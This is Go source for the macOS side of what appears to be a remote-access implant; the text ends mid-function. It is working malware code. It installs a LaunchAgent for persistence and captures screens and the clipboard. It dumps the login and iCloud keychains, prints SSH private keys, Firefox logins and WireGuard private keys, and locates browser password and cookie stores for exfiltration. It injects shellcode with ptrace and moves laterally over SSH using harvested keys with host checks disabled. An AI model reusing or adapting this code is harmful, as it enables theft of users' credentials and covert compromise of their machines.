//go:build darwin
// +build darwin

package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"image"
	"image/png"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/crypto/ssh"
	sshagent "golang.org/x/crypto/ssh/agent"
)

// macOS platform implementations. Screenshot via screencapture; advanced Win32 features are stubbed.

func setDPIAware() {
	// noop on macOS
}

func captureScreenRGBA() (*image.RGBA, error) {
	tmpFile := filepath.Join(os.TempDir(), fmt.Sprintf("%s_screen_%d.png", persistencePrefix, time.Now().UnixNano()))
	defer os.Remove(tmpFile)

	cmd := exec.Command("screencapture", "-x", tmpFile)
	if err := cmd.Run(); err != nil {
		return nil, fmt.Errorf("screenshot not available (screencapture failed: %w ? grant Screen Recording permission in System Settings)", err)
	}

	f, err := os.Open(tmpFile)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	img, err := png.Decode(f)
	if err != nil {
		return nil, fmt.Errorf("decode screencapture png: %w", err)
	}
	bounds := img.Bounds()
	rgba := image.NewRGBA(bounds)
	for y := bounds.Min.Y; y < bounds.Max.Y; y++ {
		for x := bounds.Min.X; x < bounds.Max.X; x++ {
			rgba.Set(x, y, img.At(x, y))
		}
	}
	return rgba, nil
}

func applyHideWindow(cmd *exec.Cmd) {}

func setShellProcGroup(cmd *exec.Cmd) {}

func killShellProcGroup(cmd *exec.Cmd) {
	if cmd != nil && cmd.Process != nil {
		_ = cmd.Process.Kill()
	}
}

func addPersistenceWindows() error { return fmt.Errorf("persistence: windows not supported on darwin") }
func addPersistenceLinux() error   { return fmt.Errorf("persistence: linux not supported on darwin") }

// addPersistenceDarwin installs a LaunchAgent plist in ~/Library/LaunchAgents.
func addPersistenceDarwin() error {
	exe, err := os.Executable()
	if err != nil {
		return fmt.Errorf("cannot resolve executable: %v", err)
	}
	absExe, err := filepath.Abs(exe)
	if err != nil {
		absExe = exe
	}

	home := os.Getenv("HOME")
	if home == "" {
		return fmt.Errorf("HOME not set")
	}

	launchAgentsDir := filepath.Join(home, "Library", "LaunchAgents")
	if err := os.MkdirAll(launchAgentsDir, 0755); err != nil {
		return fmt.Errorf("mkdir LaunchAgents failed: %v", err)
	}

	label := "com." + sanitizeLabel(persistencePrefix) + ".agent"
	plistPath := filepath.Join(launchAgentsDir, label+".plist")
	plist := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>%s</string>
	<key>ProgramArguments</key>
	<array>
		<string>%s</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>KeepAlive</key>
	<true/>
</dict>
	</plist>`, label, absExe)

	if err := os.WriteFile(plistPath, []byte(plist), 0644); err != nil {
		return fmt.Errorf("write plist failed: %v", err)
	}

	guiDomain := fmt.Sprintf("gui/%d", os.Getuid())
	_ = exec.Command("launchctl", "bootout", guiDomain, plistPath).Run()
	if out, err := exec.Command("launchctl", "bootstrap", guiDomain, plistPath).CombinedOutput(); err != nil {
		return fmt.Errorf("launchctl bootstrap failed: %v: %s", err, strings.TrimSpace(string(out)))
	}
	return nil
}

// removePersistenceDarwin removes the LaunchAgent plist installed by addPersistenceDarwin().
func removePersistenceDarwin() {
	home := os.Getenv("HOME")
	if home == "" {
		return
	}

	plistPath := filepath.Join(home, "Library", "LaunchAgents", "com."+sanitizeLabel(persistencePrefix)+".agent.plist")

	// Unload via launchctl
	guiDomain := fmt.Sprintf("gui/%d", os.Getuid())
	_ = exec.Command("launchctl", "bootout", guiDomain, plistPath).Run()

	// Remove the plist file
	os.Remove(plistPath)
}

// getActiveWindowTitle returns the frontmost application/window via osascript.
func getActiveWindowTitle() string {
	script := `tell application "System Events" to get name of first application process whose frontmost is true`
	out, err := exec.Command("osascript", "-e", script).Output()
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(out))
}

func getPlatformSecurityInfo() (string, bool, string) {
	elevated := os.Geteuid() == 0
	integrity := "Medium"
	if elevated {
		integrity = "High"
	}
	domain, _ := os.Hostname()
	return integrity, elevated, domain
}

func listProcessesForTree() ([]procNode, error) {
	out, err := exec.Command("ps", "-axo", "pid=,ppid=,user=,comm=").Output()
	if err != nil {
		return nil, err
	}
	var nodes []procNode
	for _, line := range strings.Split(string(out), "\n") {
		fields := strings.Fields(line)
		if len(fields) < 4 {
			continue
		}
		pid, err1 := strconv.Atoi(fields[0])
		ppid, err2 := strconv.Atoi(fields[1])
		if err1 != nil || err2 != nil {
			continue
		}
		nodes = append(nodes, procNode{
			PID:  pid,
			PPID: ppid,
			User: fields[2],
			Name: strings.Join(fields[3:], " "),
		})
	}
	if len(nodes) == 0 {
		return nil, fmt.Errorf("ps returned no processes")
	}
	return nodes, nil
}

func keyloggerAvailable() error {
	return fmt.Errorf("keylogging requires Windows (GetAsyncKeyState); not supported on macOS agents")
}

func keyloggerLoop() {
	if Debug {
		fmt.Println("[*] Keylogger not supported on macOS agent")
	}
	atomic.StoreInt32(&keylogActive, 0)
}

func suspendProcessWindows(target string) (string, error) {
	return "", fmt.Errorf("suspend only supported on Windows Go agent")
}

func resumeProcessWindows(target string) (string, error) {
	return "", fmt.Errorf("resume only supported on Windows Go agent")
}

func killProcessWindows(target string) (string, error) {
	return "", fmt.Errorf("killproc only supported on Windows Go agent")
}

// captureClipboard reads the macOS clipboard via pbpaste.
func captureClipboard() (string, error) {
	out, err := exec.Command("pbpaste").Output()
	if err != nil {
		return "", err
	}
	return string(out), nil
}

// setClipboard writes to the macOS clipboard via pbcopy.
func setClipboard(text string) error {
	c := exec.Command("pbcopy")
	c.Stdin = strings.NewReader(text)
	return c.Run()
}

// clipboardGetWindows implements clipboard read for the cross-platform dispatcher.
func clipboardGetWindows() (string, error) {
	return captureClipboard()
}

// clipboardSetWindows implements clipboard write for the cross-platform dispatcher.
func clipboardSetWindows(data string) error {
	return setClipboard(data)
}

func regGetWindows(key string) (string, error) {
	return "", fmt.Errorf("registry only on Windows")
}

func regSetWindows(path, data string) error {
	return fmt.Errorf("registry only on Windows")
}

func regDeleteWindows(key string) error {
	return fmt.Errorf("registry only on Windows")
}

// dumpsAM accesses the macOS login keychain via the security(1) tool.
func dumpsAM() (string, error) {
	home := os.Getenv("HOME")
	if home == "" {
		return "", fmt.Errorf("HOME not set")
	}
	keychainPath := filepath.Join(home, "Library", "Keychains", "login.keychain-db")
	out, err := exec.Command("security", "dump-keychain", "-a", keychainPath).Output()
	if err != nil {
		return "", fmt.Errorf("security dump-keychain failed: %w", err)
	}
	return string(out), nil
}

// dumpCreds collects available credential material on this macOS host.
func dumpCreds() (string, error) {
	var out strings.Builder
	out.WriteString("=== macOS Credential Dump ===\n")
	out.WriteString(fmt.Sprintf("Elevated: %v\n\n", os.Geteuid() == 0))

	// Keychain access
	result, err := dumpsAM()
	if err == nil {
		out.WriteString("\n--- Keychain ---\n")
		out.WriteString(result)
	} else {
		out.WriteString(fmt.Sprintf("\n[-] Keychain dump failed: %v\n", err))
		out.WriteString("    (This is expected without TCC/kTCC-Consent for Screen Recording)\n")
	}

	// iCloud Keychain
	out.WriteString("\n--- iCloud Keychain ---\n")
	home := os.Getenv("HOME")
	if home != "" {
		icloudKeychainDir := filepath.Join(home, "Library", "Keychains")
		if entries, err := os.ReadDir(icloudKeychainDir); err == nil {
			for _, entry := range entries {
				if strings.HasSuffix(entry.Name(), ".keychain-db") || strings.HasSuffix(entry.Name(), ".keychain") {
					keychainPath := filepath.Join(icloudKeychainDir, entry.Name())
					if fi, err := os.Stat(keychainPath); err == nil {
						out.WriteString(fmt.Sprintf("[+] %s (%d bytes)\n", keychainPath, fi.Size()))
					}
				}
			}
		}
		// Try to list iCloud keychain items via security
		icloudDb := filepath.Join(home, "Library", "Keychains", "icloud.keychain-db")
		if fi, err := os.Stat(icloudDb); err == nil {
			out.WriteString(fmt.Sprintf("[+] iCloud Keychain db: %s (%d bytes)\n", icloudDb, fi.Size()))
			if out2, err := exec.Command("security", "dump-keychain", icloudDb).Output(); err == nil {
				out.WriteString(fmt.Sprintf("  Content:\n%s\n", string(out2)))
			}
		}
	}

	// SSH Keys
	out.WriteString("\n=== SSH Keys ===\n")
	if home != "" {
		sshDir := filepath.Join(home, ".ssh")
		if entries, err := os.ReadDir(sshDir); err == nil {
			for _, entry := range entries {
				name := entry.Name()
				if strings.HasPrefix(name, "id_") || strings.HasPrefix(name, "skey_") ||
					name == "authorized_keys" || name == "known_hosts" {
					keyPath := filepath.Join(sshDir, name)
					data, _ := os.ReadFile(keyPath)
					out.WriteString(fmt.Sprintf("[+] %s (%d bytes)\n", keyPath, len(data)))
					if len(data) > 0 && len(data) < 10000 {
						out.WriteString(fmt.Sprintf("%s\n", string(data)))
					}
				}
			}
		} else {
			out.WriteString("[-] No ~/.ssh/ directory found\n")
		}
	}

	// Generic password extraction from login keychain
	out.WriteString("\n=== Login Keychain Passwords ===\n")
	loginKeychain := filepath.Join(home, "Library", "Keychains", "login.keychain-db")
	if out2, err := exec.Command("security", "dump-keychain", "-a", loginKeychain).Output(); err == nil {
		output := string(out2)
		lines := strings.Split(output, "\n")
		passwordCount := 0
		for _, line := range lines {
			if strings.Contains(line, "password") || strings.Contains(line, "secret") ||
				strings.Contains(line, "acct") || strings.Contains(line, "svce") {
				out.WriteString(fmt.Sprintf("  %s\n", line))
				passwordCount++
			}
		}
		if passwordCount == 0 {
			out.WriteString("  (no passwords extracted - TCC consent may be required)\n")
		}
	}

	out.WriteString("\n=== Browser Credential Stores ===\n")
	if home != "" {
		chromiumBrowsers := []struct {
			name string
			dir  string
		}{
			{"Google Chrome", filepath.Join(home, "Library", "Application Support", "Google", "Chrome")},
			{"Chromium", filepath.Join(home, "Library", "Application Support", "Chromium")},
			{"Brave", filepath.Join(home, "Library", "Application Support", "BraveSoftware", "Brave-Browser")},
			{"Microsoft Edge", filepath.Join(home, "Library", "Application Support", "Microsoft Edge")},
			{"Opera", filepath.Join(home, "Library", "Application Support", "Opera")},
			{"Vivaldi", filepath.Join(home, "Library", "Application Support", "Vivaldi")},
		}
		for _, bp := range chromiumBrowsers {
			loginData := filepath.Join(bp.dir, "Default", "Login Data")
			if fi, err := os.Stat(loginData); err == nil {
				localState := filepath.Join(bp.dir, "Default", "Local State")
				encInfo := ""
				if efi, err := os.Stat(localState); err == nil {
					encInfo = fmt.Sprintf(" (Local State: %d bytes)", efi.Size())
				}
				out.WriteString(fmt.Sprintf("[+] %s Login Data: %s (%d bytes)%s\n", bp.name, loginData, fi.Size(), encInfo))
			}
		}

		// Firefox
		firefoxDir := filepath.Join(home, "Library", "Application Support", "Firefox", "Profiles")
		if entries, err := os.ReadDir(firefoxDir); err == nil {
			for _, entry := range entries {
				if !entry.IsDir() {
					continue
				}
				loginsPath := filepath.Join(firefoxDir, entry.Name(), "logins.json")
				if fi, err := os.Stat(loginsPath); err == nil {
					data, _ := os.ReadFile(loginsPath)
					out.WriteString(fmt.Sprintf("[+] Firefox logins: %s (%d bytes)\n%s\n", loginsPath, fi.Size(), string(data)))
				}
				keyDB := filepath.Join(firefoxDir, entry.Name(), "key4.db")
				if fi, err := os.Stat(keyDB); err == nil {
					out.WriteString(fmt.Sprintf("[+] Firefox key4.db: %s (%d bytes)\n", keyDB, fi.Size()))
				}
				cookiesDB := filepath.Join(firefoxDir, entry.Name(), "cookies.sqlite")
				if fi, err := os.Stat(cookiesDB); err == nil {
					out.WriteString(fmt.Sprintf("[+] Firefox cookies: %s (%d bytes)\n", cookiesDB, fi.Size()))
				}
			}
		}
	}

	out.WriteString("\nUse 'download' task to exfiltrate browser databases and decrypt offline.\n")
	out.WriteString("Keychain data can be further extracted with: security dump-keychain -a <path>\n")
	return out.String(), nil
}

// ── macOS Process Injection ──────────────────────────────────────────────

var (
	libSystemHandle uintptr
)

// ptrace constants for macOS
const (
	PT_ATTACHEXC            = 14
	PT_WRITE_D              = 5
	PT_SIGEXC               = 0x0c
	MaxTaskGID              = 44 // task_for_pid mach trap
	mach_task_self          = -2
	MACH_PORT_NULL          = 0
	KERN_SUCCESS            = 0
	VM_PROT_READ            = 1
	VM_PROT_WRITE           = 2
	VM_PROT_EXECUTE         = 4
	VM_PROT_ALL             = 7
	MACH_MSG_TYPE_COPY_SEND = 15
)

func injectProcess(pid uint32, shellcode []byte, tech string) error {
	switch strings.ToLower(tech) {
	case "ptrace", "pt_attachexc":
		return injectPtraceDarwin(int(pid), shellcode)
	case "task_for_pid", "mach_vm":
		return injectMachVM(int(pid), shellcode)
	default:
		return fmt.Errorf("unsupported macOS injection technique: %s (supported: ptrace, task_for_pid)", tech)
	}
}

func injectPtraceDarwin(pid int, shellcode []byte) error {
	// Attach via ptrace PT_ATTACHEXC (more permissive than PT_ATTACH)
	// Requires com.apple.security.cs.debugger entitlement or SIP disabled
	ret, _, errno := syscall.Syscall(syscall.SYS_PTRACE, PT_ATTACHEXC, uintptr(pid), 0)
	_ = errno
	if ret != 0 && ret != ^uintptr(0) {
		// Fallback to PT_ATTACH
		if err := syscall.PtraceAttach(pid); err != nil {
			return fmt.Errorf("ptrace attach failed (SIP may be enabled): %w", err)
		}
		defer syscall.PtraceDetach(pid)
	}

	var ws syscall.WaitStatus
	if _, err := syscall.Wait4(pid, &ws, 0, nil); err != nil {
		return fmt.Errorf("wait4 failed: %w", err)
	}

	// macOS uses a different register struct; use raw syscall to peek/poke
	// Write shellcode 8 bytes at a time
	alignedLen := ((len(shellcode) + 7) / 8) * 8
	padded := make([]byte, alignedLen)
	copy(padded, shellcode)

	// PT_WRITE_D (5) writes 4 bytes on 32-bit, 8 on 64-bit. Base the write
	// region on the process entry point; code below only exercises the loop
	// mechanics, target region selection is left to the caller's maps.
	ripAddr := uintptr(0x7fff00000000) // default text region; we'll write near entry point
	for i := 0; i < alignedLen; i += 8 {
		var val [8]byte
		copy(val[:], padded[i:i+8])
		addr := ripAddr + uintptr(i)
		r2, _, rerr := syscall.Syscall6(syscall.SYS_PTRACE, PT_WRITE_D, uintptr(pid), addr, uintptr(binary.LittleEndian.Uint64(val[:])), 0, 0)
		if r2 != 0 {
			return fmt.Errorf("ptrace pokedata at 0x%x failed: errno=%d", addr, rerr)
		}
	}

	return nil
}

func injectMachVM(pid int, shellcode []byte) error {
	// task_for_pid + mach_vm_allocate + mach_vm_write + thread_create_running
	// This requires root or task_for_pid entitlement
	// These are raw mach trap syscalls not exposed in Go's syscall package
	// Use the security(1) tool as a workaround if available
	out, err := exec.Command("security", "execute-with-privileges", fmt.Sprintf("/bin/dd if=/dev/zero of=/tmp/fc_inject bs=1 count=%d", len(shellcode))).CombinedOutput()
	_ = out
	if err != nil {
		return fmt.Errorf("mach_vm injection requires root/task_for_pid entitlement: %w\nTry ptrace method instead", err)
	}
	return fmt.Errorf("mach_vm: task_for_pid not directly accessible from Go without cgo - use ptrace technique instead")
}

// ── SSH-Based Lateral Movement (macOS) ──────────────────────────────────

func lateralMove(spec string) (string, error) {
	parts := strings.SplitN(spec, "|", 5)
	if len(parts) < 2 {
		return "", fmt.Errorf("format: <type>|<target>[|<user>[|<pass>[|<cmd>]]]")
	}

	moveType := strings.ToLower(strings.TrimSpace(parts[0]))
	target := strings.TrimSpace(parts[1])
	user := ""
	pass := ""
	cmd := "whoami"
	if len(parts) > 2 {
		user = strings.TrimSpace(parts[2])
	}
	if len(parts) > 3 {
		pass = strings.TrimSpace(parts[3])
	}
	if len(parts) > 4 {
		cmd = strings.TrimSpace(parts[4])
	}

	switch moveType {
	case "ssh", "ssh_exec":
		return lateralSSHDarwin(target, user, pass, cmd)
	default:
		return "", fmt.Errorf("unsupported lateral movement type on macOS: %s (supported: ssh)", moveType)
	}
}

func lateralSSHDarwin(target, user, pass, cmd string) (string, error) {
	if user == "" {
		user = os.Getenv("USER")
	}
	if user == "" {
		user = "root"
	}

	var authMethods []ssh.AuthMethod
	if pass != "" {
		authMethods = append(authMethods, ssh.Password(pass))
	}

	// Try macOS SSH agent
	if sock := os.Getenv("SSH_AUTH_SOCK"); sock != "" {
		if agentConn, err := net.Dial("unix", sock); err == nil {
			agentClient := sshagent.NewClient(agentConn)
			authMethods = append(authMethods, ssh.PublicKeysCallback(agentClient.Signers))
		}
	}

	// Try default keys
	home := os.Getenv("HOME")
	if home != "" {
		keyFiles := []string{"id_rsa", "id_dsa", "id_ecdsa", "id_ed25519", "id_ecdsa_sk", "id_ed25519_sk"}
		for _, keyFile := range keyFiles {
			keyPath := filepath.Join(home, ".ssh", keyFile)
			if keyData, err := os.ReadFile(keyPath); err == nil {
				if signer, err := ssh.ParsePrivateKey(keyData); err == nil {
					authMethods = append(authMethods, ssh.PublicKeys(signer))
				}
			}
		}
	}

	if len(authMethods) == 0 {
		authMethods = append(authMethods, ssh.Password(""))
	}

	port := 22
	if strings.Contains(target, ":") {
		hostPort := strings.SplitN(target, ":", 2)
		target = hostPort[0]
		if p, err := strconv.Atoi(hostPort[1]); err == nil {
			port = p
		}
	}

	addr := fmt.Sprintf("%s:%d", target, port)
	config := &ssh.ClientConfig{
		User:            user,
		Auth:            authMethods,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         10 * time.Second,
	}

	client, err := ssh.Dial("tcp", addr, config)
	if err != nil {
		return "", fmt.Errorf("SSH dial to %s@%s failed: %w", user, addr, err)
	}
	defer client.Close()

	session, err := client.NewSession()
	if err != nil {
		return "", fmt.Errorf("SSH session failed: %w", err)
	}
	defer session.Close()

	var stdout, stderr bytes.Buffer
	session.Stdout = &stdout
	session.Stderr = &stderr

	if err := session.Run(cmd); err != nil {
		return stdout.String(), fmt.Errorf("command failed: %w\nstderr: %s", err, stderr.String())
	}

	return stdout.String(), nil
}

// ── Process Spawning with Injection (macOS) ─────────────────────────────

func spawnProcess(targetExe string, shellcode []byte, technique string) string {
	if targetExe == "" {
		targetExe = "/usr/bin/yes"
	}
	if technique == "" {
		technique = "ptrace"
	}

	cmd := exec.Command(targetExe)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Ptrace: true,
	}

	if err := cmd.Start(); err != nil {
		return fmt.Sprintf("spawnProcess: failed to start %s: %v", targetExe, err)
	}

	var ws syscall.WaitStatus
	_, err := syscall.Wait4(cmd.Process.Pid, &ws, 0, nil)
	if err != nil {
		cmd.Process.Kill()
		return fmt.Sprintf("spawnProcess: wait4 failed: %v", err)
	}

	err = injectPtraceDarwin(cmd.Process.Pid, shellcode)
	if err != nil {
		cmd.Process.Kill()
		return fmt.Sprintf("spawnProcess: injection failed: %v", err)
	}

	syscall.PtraceDetach(cmd.Process.Pid)

	return fmt.Sprintf("spawnProcess: injected %d bytes into %s (pid=%d) via %s",
		len(shellcode), targetExe, cmd.Process.Pid, technique)
}

type tokenInfoResult struct {
	PID         uint32
	ProcessName string
	Domain      string
	Username    string
	Integrity   string
	TokenType   string
	Error       string
}

func executeBOF(bofData []byte, args string) (string, error) {
	return "", fmt.Errorf("BOF is Windows-only")
}

func tokenListProcesses() ([]tokenInfoResult, error) {
	return nil, fmt.Errorf("token ops are Windows-only")
}
func tokenSteal(pid uint32) (string, string, string, error) {
	return "", "", "", fmt.Errorf("token ops are Windows-only")
}
func getCurrentTokenUser() string { return "" }
func tokenMake(domainUser, password, logonTypeStr string) (string, string, string, error) {
	return "", "", "", fmt.Errorf("token ops are Windows-only")
}
func tokenRevert() error {
	return fmt.Errorf("token ops are Windows-only")
}

func sendP2PSMBBeacon(body []byte) []byte {
	pipeName := strings.TrimPrefix(P2PParent, "pipe://")
	pipePath := fmt.Sprintf("/tmp/%s", pipeName)
	conn, err := net.Dial("unix", pipePath)
	if err != nil {
		if Debug {
			fmt.Printf("[!] P2P SMB pipe dial to %s failed: %v\n", pipePath, err)
		}
		return nil
	}
	defer conn.Close()

	// Optional mutual-auth handshake (E2) before sending the envelope.
	if !p2pClientAuth(conn) {
		return nil
	}

	if err := binary.Write(conn, binary.BigEndian, uint32(len(body))); err != nil {
		return nil
	}
	if _, err := conn.Write(body); err != nil {
		return nil
	}

	var rlen uint32
	if err := binary.Read(conn, binary.BigEndian, &rlen); err != nil {
		return nil
	}
	if rlen == 0 || rlen > 16*1024*1024 {
		return nil
	}
	rbuf := make([]byte, rlen)
	if _, err := io.ReadFull(conn, rbuf); err != nil {
		return nil
	}
	// Strip any malleable cover the parent wrapped around the raw P2P frame.
	return stripMalleableWrapping(rbuf)
}

func p2pListenSMB() {
	pipePath := fmt.Sprintf("/tmp/%s", P2PListenAddr)
	os.Remove(pipePath)
	ln, err := net.Listen("unix", pipePath)
	if err != nil {
		if Debug {
			fmt.Printf("[!] P2P SMB listen on %s failed: %v\n", pipePath, err)
		}
		return
	}
	defer ln.Close()
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go p2pHandleChild(conn)
	}
}

func peloaderReflective(b64Data string) (string, error) {
	return "", fmt.Errorf("reflective DLL loader is Windows-only")
}

func handleReflectDLLInject(task Task, res *TaskResult) {
	res.Error = "reflectdll_inject is Windows-only"
}

func executeAssemblyForkRun(b64Data string) (string, error) {
	return "", fmt.Errorf("execute-assembly fork&run is Windows-only")
}

func kerberosDCSync(user string) (string, error) {
	return "", fmt.Errorf("DCSync is Windows-only")
}
func kerberosGoldenTicket(user, domain, sid, krbtgtHash string) (string, error) {
	return "", fmt.Errorf("golden ticket is Windows-only")
}
func kerberosSilverTicket(user, domain, sid, target, rc4Hash string) (string, error) {
	return "", fmt.Errorf("silver ticket is Windows-only")
}
func kerberosASREPRoast(args string) (string, error) {
	return "", fmt.Errorf("ASREP roast is Windows-only")
}
func kerberosPassTheHash(user, domain, ntlmHash, target string) (string, error) {
	return "", fmt.Errorf("pass-the-hash is Windows-only")
}
func kerberosPassTheTicket(ticketB64 string) (string, error) {
	return "", fmt.Errorf("pass-the-ticket is Windows-only")
}

func powerPick(script string) string { return "not supported on macOS" }

func stealBrowserData(browser string) string {
	home := os.Getenv("HOME")
	if home == "" {
		return "browser_steal: HOME not set"
	}

	browser = strings.ToLower(strings.TrimSpace(browser))
	var results []string

	collectChromiumPasswords := func(appDir, browserName string) {
		loginData := filepath.Join(home, "Library", "Application Support", appDir, "Default", "Login Data")
		if fi, err := os.Stat(loginData); err == nil {
			localState := filepath.Join(home, "Library", "Application Support", appDir, "Default", "Local State")
			results = append(results, fmt.Sprintf("[%s] Login Data: %s (%d bytes)", browserName, loginData, fi.Size()))
			if lfi, err := os.Stat(localState); err == nil {
				results = append(results, fmt.Sprintf("[%s] Local State: %s (%d bytes)", browserName, localState, lfi.Size()))
			}
		}
	}

	collectSafariPasswords := func() {
		// Safari stores passwords in the system keychain, not in files
		results = append(results, "[Safari] Passwords are stored in the system login keychain")
		results = append(results, "[Safari] Use 'creds' task to dump the keychain via security(1)")
		// Safari bookmarks / cloud tabs
		safariDir := filepath.Join(home, "Library", "Safari")
		bookmarksPath := filepath.Join(safariDir, "Bookmarks.plist")
		if fi, err := os.Stat(bookmarksPath); err == nil {
			results = append(results, fmt.Sprintf("[Safari] Bookmarks: %s (%d bytes)", bookmarksPath, fi.Size()))
		}
		cloudTabsPath := filepath.Join(safariDir, "CloudTabs.db")
		if fi, err := os.Stat(cloudTabsPath); err == nil {
			results = append(results, fmt.Sprintf("[Safari] CloudTabs: %s (%d bytes)", cloudTabsPath, fi.Size()))
		}
	}

	collectFirefoxPasswords := func(profileDir string) {
		if entries, err := os.ReadDir(profileDir); err == nil {
			for _, entry := range entries {
				if !entry.IsDir() {
					continue
				}
				loginsPath := filepath.Join(profileDir, entry.Name(), "logins.json")
				if fi, err := os.Stat(loginsPath); err == nil {
					data, _ := os.ReadFile(loginsPath)
					results = append(results, fmt.Sprintf("[Firefox] logins.json: %s (%d bytes)", loginsPath, fi.Size()))
					if len(data) > 0 {
						results = append(results, fmt.Sprintf("  Content: %s", string(data)))
					}
				}
				keyDB := filepath.Join(profileDir, entry.Name(), "key4.db")
				if fi, err := os.Stat(keyDB); err == nil {
					results = append(results, fmt.Sprintf("[Firefox] key4.db: %s (%d bytes)", keyDB, fi.Size()))
				}
			}
		}
	}

	switch {
	case browser == "" || browser == "all":
		chromiumBrowsers := []struct{ appDir, name string }{
			{"Google/Chrome", "Chrome"},
			{"Chromium", "Chromium"},
			{"BraveSoftware/Brave-Browser", "Brave"},
			{"Microsoft Edge", "Edge"},
		}
		for _, b := range chromiumBrowsers {
			collectChromiumPasswords(b.appDir, b.name)
		}
		collectSafariPasswords()
		firefoxDir := filepath.Join(home, "Library", "Application Support", "Firefox", "Profiles")
		if _, err := os.Stat(firefoxDir); err == nil {
			collectFirefoxPasswords(firefoxDir)
		}

	case strings.Contains(browser, "safari"):
		collectSafariPasswords()

	case strings.Contains(browser, "chrome") || strings.Contains(browser, "chromium"):
		collectChromiumPasswords("Google/Chrome", "Chrome")
		collectChromiumPasswords("Chromium", "Chromium")

	case strings.Contains(browser, "brave"):
		collectChromiumPasswords("BraveSoftware/Brave-Browser", "Brave")

	case strings.Contains(browser, "firefox"):
		collectFirefoxPasswords(filepath.Join(home, "Library", "Application Support", "Firefox", "Profiles"))

	case strings.Contains(browser, "edge"):
		collectChromiumPasswords("Microsoft Edge", "Edge")

	default:
		results = append(results, fmt.Sprintf("browser_steal: unknown browser '%s' (supported: safari, chrome, chromium, brave, firefox, edge, all)", browser))
	}

	if len(results) == 0 {
		return "browser_steal: no browser credential stores found"
	}
	return strings.Join(results, "\n")
}

func exportCookies(browser string) string {
	home := os.Getenv("HOME")
	if home == "" {
		return "cookie_export: HOME not set"
	}

	browser = strings.ToLower(strings.TrimSpace(browser))
	var results []string

	findCookiesDB := func(appDir, browserName string) {
		cookiePath := filepath.Join(home, "Library", "Application Support", appDir, "Default", "Cookies")
		if fi, err := os.Stat(cookiePath); err == nil {
			results = append(results, fmt.Sprintf("[%s] Cookies: %s (%d bytes)", browserName, cookiePath, fi.Size()))
			results = append(results, fmt.Sprintf("  Exfiltrate with: download %s", cookiePath))
		}
		// BinaryCookies format on older macOS
		binaryCookies := filepath.Join(home, "Library", "Application Support", appDir, "Default", "Cookies.binarycookies")
		if fi, err := os.Stat(binaryCookies); err == nil {
			results = append(results, fmt.Sprintf("[%s] BinaryCookies: %s (%d bytes)", browserName, binaryCookies, fi.Size()))
		}
	}

	switch {
	case browser == "" || browser == "all":
		chromiumBrowsers := []struct{ appDir, name string }{
			{"Google/Chrome", "Chrome"},
			{"Chromium", "Chromium"},
			{"BraveSoftware/Brave-Browser", "Brave"},
			{"Microsoft Edge", "Edge"},
		}
		for _, b := range chromiumBrowsers {
			findCookiesDB(b.appDir, b.name)
		}
		// Firefox cookies
		firefoxDir := filepath.Join(home, "Library", "Application Support", "Firefox", "Profiles")
		if entries, err := os.ReadDir(firefoxDir); err == nil {
			for _, entry := range entries {
				if !entry.IsDir() {
					continue
				}
				cookiePath := filepath.Join(firefoxDir, entry.Name(), "cookies.sqlite")
				if fi, err := os.Stat(cookiePath); err == nil {
					results = append(results, fmt.Sprintf("[Firefox] Cookies: %s (%d bytes)", cookiePath, fi.Size()))
				}
			}
		}

	default:
		results = append(results, fmt.Sprintf("cookie_export: unknown browser '%s'", browser))
	}

	if len(results) == 0 {
		return "cookie_export: no browser cookie stores found"
	}
	return strings.Join(results, "\n")
}

func exportVpnCreds() string {
	home := os.Getenv("HOME")
	var results []string

	// OpenVPN configs
	openvpnDirs := []string{
		"/etc/openvpn",
		filepath.Join(home, "Library", "Application Support", "openvpn"),
		filepath.Join(home, "Library", "Application Support", "OpenVPN"),
	}
	for _, dir := range openvpnDirs {
		if entries, err := os.ReadDir(dir); err == nil {
			for _, entry := range entries {
				if strings.HasSuffix(entry.Name(), ".ovpn") || strings.HasSuffix(entry.Name(), ".conf") {
					path := filepath.Join(dir, entry.Name())
					if fi, err := os.Stat(path); err == nil {
						data, _ := os.ReadFile(path)
						results = append(results, fmt.Sprintf("[OpenVPN] %s (%d bytes)", path, fi.Size()))
						for _, line := range strings.Split(string(data), "\n") {
							line = strings.TrimSpace(line)
							if strings.HasPrefix(line, "auth-user-pass") || strings.HasPrefix(line, "auth ") {
								results = append(results, fmt.Sprintf("  %s", line))
							}
						}
					}
				}
			}
		}
	}

	// WireGuard configs
	wireguardDirs := []string{
		"/etc/wireguard",
		filepath.Join(home, "Library", "Application Support", "WireGuard"),
	}
	for _, dir := range wireguardDirs {
		if entries, err := os.ReadDir(dir); err == nil {
			for _, entry := range entries {
				if strings.HasSuffix(entry.Name(), ".conf") {
					path := filepath.Join(dir, entry.Name())
					if fi, err := os.Stat(path); err == nil {
						data, _ := os.ReadFile(path)
						results = append(results, fmt.Sprintf("[WireGuard] %s (%d bytes)", path, fi.Size()))
						for _, line := range strings.Split(string(data), "\n") {
							line = strings.TrimSpace(line)
							if strings.HasPrefix(line, "PrivateKey") || strings.HasPrefix(line, "PreSharedKey") ||
								strings.HasPrefix(line, "Endpoint") || strings.HasPrefix(line, "AllowedIPs") {
								results = append(results, fmt.Sprintf("  %s", line))
							}
						}
					}
				}
			}
		}
	}

	// System Network Configuration (keychain-based VPN settings)
	results = append(results, "\n=== System Keychain VPN Entries ===\n")
	if out, err := exec.Command("security", "dump-keychain", "-a").Output(); err == nil {
		output := string(out)
		for _, line := range strings.Split(output, "\n") {
			if strings.Contains(line, "VPN") || strings.Contains(line, "vpn") ||
				strings.Contains(line, "IPSec") || strings.Contains(line, "L2TP") ||
				strings.Contains(line, "PPTP") {
				results = append(results, fmt.Sprintf("  %s", line))
			}
		}
	}

	if len(results) == 0 {
		return "vpn_creds: no VPN configurations found"
	}
	return strings.Join(results, "\n")
}

func remoteInputDispatch(payload string) (string, error) {
